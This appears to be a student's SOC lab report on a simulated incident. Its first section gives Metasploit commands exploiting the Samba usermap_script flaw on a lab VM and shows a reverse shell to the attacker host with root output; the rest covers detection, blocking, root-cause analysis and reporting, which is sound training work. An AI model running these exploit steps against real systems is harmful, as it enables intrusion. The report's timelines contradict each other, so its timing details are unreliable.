# Task 8 — Capstone Project: Comprehensive SOC Incident Response

## Overview

**Objective:** Simulate a full attack lifecycle, detect and triage alerts, contain the threat, conduct post-incident analysis, and produce executive-level reporting.  
**Tools Used:** Metasploit, Wazuh, CrowdSec, TheHive, MITRE Caldera, Elastic Security  
**Incident ID:** INC-2025-0403  
**Date:** 2025-04-03  
**Analyst:** SOC Intern — CyArt Tech India  

---

## 1. Attack Simulation — Metasploit Samba Exploit

### Target Environment

| Component         | Details                         |
|-------------------|---------------------------------|
| Attacker Machine  | 192.168.1.100 (Kali Linux)      |
| Target Machine    | 192.168.1.105 (Metasploitable2) |
| Exploit Module    | exploit/multi/samba/usermap_script |
| MITRE Technique   | T1210 — Exploitation of Remote Services |

### Metasploit Commands Executed

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.1.105
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

### Result

```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Command shell session 1 opened (192.168.1.100:4444 -> 192.168.1.105:60412)
id
uid=0(root) gid=0(root)
```

**Outcome:** Root shell obtained on Metasploitable2 via CVE-2007-2447 (Samba usermap_script).

---

## 2. Adversary Emulation — MITRE Caldera (T1210)

| Timestamp            | Source IP      | Alert Description              | MITRE Technique |
|----------------------|----------------|--------------------------------|-----------------|
| 2025-04-03 07:00:14  | 192.168.1.100  | Port scan detected (pre-exploit) | T1046         |
| 2025-04-03 07:02:38  | 192.168.1.100  | Samba exploit attempt          | T1210           |
| 2025-04-03 07:03:01  | 192.168.1.100  | Reverse shell connection opened | T1059.004      |
| 2025-04-03 07:05:22  | 192.168.1.105  | Privilege escalation to root   | T1068           |
| 2025-04-03 07:08:45  | 192.168.1.105  | Lateral movement attempt       | T1021           |

---

## 3. Detection and Triage — Wazuh + TheHive

### Wazuh Alert

**Rule ID:** `5710` — Samba service exploit detected  
**Severity:** Level 12 (Critical)  

```
** Alert 1712134958.112233: - samba,exploit,
2025 Apr 03 07:02:38 METASPLOITABLE->/var/log/syslog
Rule: 5710 (level 12) -> 'Samba usermap_script exploit detected'
Src IP: 192.168.1.100
Dst IP: 192.168.1.105
Port: 445
Full log: smbd[1337]: failed to find service META\`/bin/sh`
```

### TheHive Case

| Field         | Value                                     |
|---------------|-------------------------------------------|
| Case ID       | #THV-2025-0403                            |
| Title         | Samba RCE - Metasploitable2               |
| Severity      | Critical                                  |
| TLP           | TLP:RED                                   |
| Status        | Resolved                                  |
| Assigned To   | SOC Analyst                               |
| Observables   | IP: 192.168.1.100, Port: 445, CVE-2007-2447 |
| Tags          | T1210, samba, rce, metasploit             |

---

## 4. Response and Containment — CrowdSec

### Actions Taken

```bash
# Block attacker IP via CrowdSec
sudo cscli decisions add --ip 192.168.1.100 --duration 24h --reason "Samba RCE exploit"

# Verify block decision
sudo cscli decisions list
```

**CrowdSec Decision Output:**
```
 ID  |   Scope/Value       | Reason         | Action | Country | AS  | Events | Expiration
-----|---------------------|----------------|--------|---------|-----|--------|------------
  1  | Ip:192.168.1.100    | Samba RCE      | ban    |         |     |      1 | 23h59m
```

**VM Isolation:** Network adapter set to Host-Only — confirmed via ping test.

```bash
ping 192.168.1.105
# Request timeout — VM successfully isolated
```

---

## 5. SOAR Automation — TheHive Playbook

### Playbook: Auto-Block on Critical Alert

| Step | Action                              | Status  | Notes                              |
|------|-------------------------------------|---------|------------------------------------|
| 1    | Wazuh alert triggers webhook        | Success | Level 12 alert forwarded           |
| 2    | TheHive case auto-created           | Success | Case #THV-2025-0403 created        |
| 3    | IP reputation check (AbuseIPDB)     | Success | IP scored 0 (internal lab IP)      |
| 4    | CrowdSec auto-block executed        | Success | 192.168.1.100 banned for 24h       |
| 5    | Analyst notification sent           | Success | Email alert dispatched             |
| 6    | Case status updated to In-Progress  | Success | Auto-assigned to SOC queue         |

---

## 6. Post-Incident Analysis

### 6.1 Root Cause Analysis — 5 Whys

| #  | Question                                   | Answer                                                  |
|----|--------------------------------------------|---------------------------------------------------------|
| 1  | Why was the system compromised?            | Samba service was exploitable (CVE-2007-2447)           |
| 2  | Why was the vulnerable Samba running?      | Metasploitable2 was not hardened or patched             |
| 3  | Why was it not patched?                    | No vulnerability management process in place            |
| 4  | Why was there no vuln management process?  | Asset inventory was incomplete — VM not tracked         |
| 5  | Why was the asset not tracked?             | No formal onboarding process for lab/dev assets         |

**Root Cause:** Absence of a formal asset inventory and vulnerability management process allowed an unpatched, exploitable service to remain exposed on the network.

### 6.2 Fishbone Diagram — Cause Categories

```
                        [SYSTEM COMPROMISE]
                               |
        +-----------+----------+-----------+-----------+
        |           |          |           |           |
    [People]   [Process]  [Technology]  [Policy]  [Environment]
        |           |          |           |           |
   No patch      No VM      Unpatched   No asset    Dev VM on
   awareness    hardening    Samba      tracking    prod subnet
   training     checklist   CVE-2007   inventory   no segmentation
```

*Full Fishbone Diagram created in Draw.io — see Screenshots folder.*

---

## 7. Metrics Reporting

| Metric               | Value        | Calculation                              |
|----------------------|--------------|------------------------------------------|
| Attack Start         | 07:00:00     | First port scan detected in firewall logs|
| First Wazuh Alert    | 07:02:38     | Rule 5710 triggered                      |
| MTTD                 | **2m 38s**   | 07:02:38 − 07:00:00                      |
| Containment Time     | 07:15:00     | CrowdSec block + VM isolation confirmed  |
| MTTR                 | **12m 22s**  | 07:15:00 − 07:02:38                      |
| Dwell Time           | **15 min**   | 07:15:00 − 07:00:00                      |
| False Positive Rate  | 0%           | Alert confirmed malicious                |

---

## 8. Full Incident Report (300 Words)

### Executive Summary
On April 3, 2025, CyArt Tech India's SOC detected and responded to a critical remote code execution (RCE) incident involving the exploitation of a Samba service vulnerability (CVE-2007-2447) on an internal test host (192.168.1.105). The incident was assigned case ID INC-2025-0403 and classified as Critical severity.

### Timeline
- **07:00:00** — Attacker (192.168.1.100) initiates network reconnaissance (T1046)
- **07:02:38** — Metasploit exploit launched against Samba service on port 445 (T1210)
- **07:03:01** — Reverse shell session established; root access obtained (T1059.004)
- **07:05:22** — Wazuh Rule 5710 triggered; TheHive case auto-created via SOAR playbook
- **07:08:45** — CrowdSec IP block applied; VM network adapter isolated
- **07:15:00** — Full containment confirmed via ping test

### Root Cause Analysis
The root cause was identified as an unpatched Metasploitable2 instance running a vulnerable version of Samba (CVE-2007-2447), which had not been tracked in the asset inventory. The absence of a formal vulnerability management process and asset onboarding procedure allowed the exposure to persist undetected.

### Metrics
The SOC achieved an MTTD of 2 minutes 38 seconds and MTTR of 12 minutes 22 seconds, demonstrating effective real-time detection and rapid containment. Overall attacker dwell time was 15 minutes.

### Recommendations
1. Implement a formal asset inventory process covering all lab and development hosts.
2. Establish a monthly vulnerability scanning schedule using OpenVAS or Nessus.
3. Apply network segmentation to isolate development VMs from the production subnet.
4. Create additional Wazuh rules for lateral movement detection (T1021) to reduce future dwell time.
5. Schedule quarterly adversary emulation exercises using MITRE Caldera to validate detection coverage continuously.

---

## 9. Stakeholder Briefing (150 Words)

**To:** CyArt Tech India Leadership  
**From:** SOC Team  
**Subject:** Security Incident Summary — April 3, 2025  

On April 3, 2025, our security team detected and neutralised a simulated cyberattack on an internal test system. An attacker exploited an outdated software vulnerability to gain unauthorised access within our lab environment. Our monitoring system raised an alert within under 3 minutes of the attack beginning, and the threat was fully contained within 15 minutes — well within acceptable response benchmarks.

No production systems or customer data were affected. The incident was used as a training exercise to validate our detection and response capabilities.

Key improvement actions identified: ensuring all internal systems are regularly patched, improving our asset tracking process, and separating test environments from production infrastructure. These measures will further strengthen our security posture and reduce risk to the organisation going forward.

---

## 10. References

- CVE-2007-2447: https://nvd.nist.gov/vuln/detail/CVE-2007-2447
- MITRE ATT&CK T1210: https://attack.mitre.org/techniques/T1210/
- NIST SP 800-61: https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final
- MITRE Caldera: https://caldera.readthedocs.io/
- CrowdSec Documentation: https://docs.crowdsec.net/
